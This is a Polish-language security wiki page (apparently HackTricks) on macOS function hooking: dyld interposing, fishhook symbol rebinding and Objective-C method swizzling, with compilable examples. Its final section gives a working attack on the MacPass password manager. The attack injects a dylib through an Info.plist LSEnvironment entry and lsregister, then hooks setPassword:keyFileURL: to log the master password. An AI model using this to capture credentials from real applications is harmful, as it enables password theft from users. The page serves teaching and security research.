# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Utwórz **dylib** z sekcją **`__interpose` (`__DATA___interpose`)** (lub sekcją oznaczoną flagą **`S_INTERPOSING`**) zawierającą krotki **wskaźników do funkcji**, które odnoszą się do **oryginalnej** i **zastępczej** funkcji.

Następnie **wstrzyknij** dylib za pomocą **`DYLD_INSERT_LIBRARIES`** (interposing musi nastąpić przed załadowaniem głównej aplikacji). Oczywiście [**ograniczenia**]((macos-library-injection/index.html#check-restrictions)) zastosowane do użycia **`DYLD_INSERT_LIBRARIES`** obowiązują tutaj również.

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Zmienna środowiskowa **`DYLD_PRINT_INTERPOSING`** może być użyta do debugowania interposing i wypisze proces interpose.

Pamiętaj też, że **interposing zachodzi między procesem a załadowanymi bibliotekami**, nie działa ze shared library cache.

### Dynamic Interposing

Teraz możliwe jest także dynamiczne interposeowanie funkcji za pomocą funkcji **`dyld_dynamic_interpose`**. Pozwala to **programatycznie** interposeować funkcję w **runtime** zamiast robić to tylko od **samego początku**.

Wystarczy wskazać **tuples** funkcji do zastąpienia oraz funkcję zastępczą.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Rebinding tablicy importów (styl fishhook)

Jeśli masz już wykonanie kodu **wewnątrz procesu** i chcesz podpiąć **zaimportowaną funkcję C** bez ponownego uruchamiania celu, bardzo popularnym prymitywem jest **symbol rebinding** (spopularyzowany przez **`fishhook`**).

Zamiast używać sekcji **`__interpose`**, ta technika przegląda metadane Mach-O (`__LINKEDIT` -> pośrednia tablica symboli -> `__la_symbol_ptr` / `__nl_symbol_ptr`) i **nadpisuje slot importu** używany przez bieżący obraz. Jest to bardzo przydatne do podpinania funkcji w **już uruchomionym** procesie albo do podpinania **tylko jednego obrazu** za pomocą **`rebind_symbols_image`**.

> [!TIP]
> Dotyczy to tylko wywołań, które faktycznie przechodzą przez **wskaźnik importu**. Jeśli funkcja docelowa jest **wywoływana bezpośrednio w tym samym obrazie**, nie ma zaimportowanego slotu do nadpisania, więc ta technika nie zobaczy tego miejsca wywołania.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Na nowszych wersjach macOS wiele celów rebindingu nie znajduje się już w zapisywalnych stronach **`__DATA`**. Rebindery zwykle muszą tymczasowo ustawić **`__DATA_CONST`** jako zapisywalne przed załataniem wskaźnika. Ponadto na Apple Silicon / **`arm64e`** należy oczekiwać uwierzytelnianych wskaźników i dodatkowego pośrednictwa w **`__AUTH_CONST.__auth_got`**, więc rebinder, który skanuje tylko klasyczne sekcje lazy/non-lazy symbol pointer, może pominąć niektóre call sites.

> [!CAUTION]
> ABI **`arm64e`** używa **Pointer Authentication (PAC)** dla wielu wskaźników funkcji. Ślepe zapisy wskaźników, które wcześniej działały na Intel, mogą zepsuć call site na Apple Silicon. Pisząc własny rebinder albo inline hooker, bądź gotowy używać helperów **`<ptrauth.h>`** takich jak **`ptrauth_sign_unauthenticated`** lub **`ptrauth_auth_and_resign`** i testuj to konkretnie na targetach **`arm64e`**.

Więcej szczegółów o **`__AUTH`**, **`__AUTH_CONST`** i **`__auth_got`** znajdziesz [na tej stronie](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

W ObjectiveC metoda jest wywoływana tak: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Potrzebny jest **object**, **method** i **params**. A gdy metoda jest wywoływana, **msg is sent** przy użyciu funkcji **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Obiekt to **`someObject`**, metoda to **`@selector(method1p1:p2:)`**, a argumenty to **value1**, **value2**.

Podążając za strukturami obiektu, można dotrzeć do **tablicy metod**, gdzie znajdują się **nazwy** i **wskaźniki** do kodu metody.

> [!CAUTION]
> Zwróć uwagę, że ponieważ do metod i klas uzyskuje się dostęp na podstawie ich nazw, te informacje są przechowywane w binarium, więc można je odzyskać za pomocą `otool -ov </path/bin>` lub [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Można uzyskać dostęp do informacji o metodach, takich jak nazwa, liczba params lub address, jak w poniższym przykładzie:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Funkcja **`method_exchangeImplementations`** pozwala **zmienić** **adres** **implementacji** **jednej funkcji na drugą**.

> [!CAUTION]
> Więc gdy wywoływana jest funkcja, to **wykonywana jest druga**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> W tym przypadku, jeśli **kod implementacji legalnej** metody **weryfikuje** **nazwę** **metody**, może **wykryć** to swizzling i uniemożliwić jego działanie.
>
> Poniższa technika nie ma tego ograniczenia.

### Method Swizzling with method_setImplementation

Poprzedni format jest dziwny, ponieważ zmieniasz implementację 2 metod jedna na drugą. Używając funkcji **`method_setImplementation`** możesz **zmienić** **implementację** **metody na inną**.

Pamiętaj tylko, aby **zachować adres implementacji oryginalnej** metody, jeśli zamierzasz wywołać ją z nowej implementacji przed jej nadpisaniem, ponieważ później będzie znacznie trudniej zlokalizować ten adres.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodologia ataku Hooking

Na tej stronie omówiono różne sposoby hookowania funkcji. Jednak obejmowały one **uruchamianie kodu wewnątrz procesu w celu ataku**.

Aby to zrobić, najłatwiejszą techniką jest wstrzyknięcie [Dyld za pomocą zmiennych środowiskowych lub hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Jednak przypuszczam, że można by to też zrobić przez [wstrzyknięcie procesu Dylib](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Jednak obie opcje są **ograniczone** do binariów/procesów **niechronionych**. Sprawdź każdą technikę, aby dowiedzieć się więcej o ograniczeniach.

Jednak atak typu function hooking jest bardzo specyficzny — atakujący zrobi to, aby **ukraść poufne informacje z wnętrza procesu** (w przeciwnym razie po prostu wykonałby atak process injection). A te poufne informacje mogą znajdować się w aplikacjach pobranych przez użytkownika, takich jak MacPass.

Wektor ataku polegałby więc albo na znalezieniu podatności, albo na usunięciu podpisu aplikacji, wstrzyknięciu zmiennej środowiskowej **`DYLD_INSERT_LIBRARIES`** przez Info.plist aplikacji, dodając coś takiego jak:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
a następnie **ponownie zarejestruj** aplikację:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Dodaj w tej bibliotece kod hookingu, aby wyexfiltrować informacje: Passwords, messages...

> [!CAUTION]
> Note that in newer versions of macOS if you **strip the signature** of the application binary and it was previously executed, macOS **won't be executing the application** anymore.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referencje

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
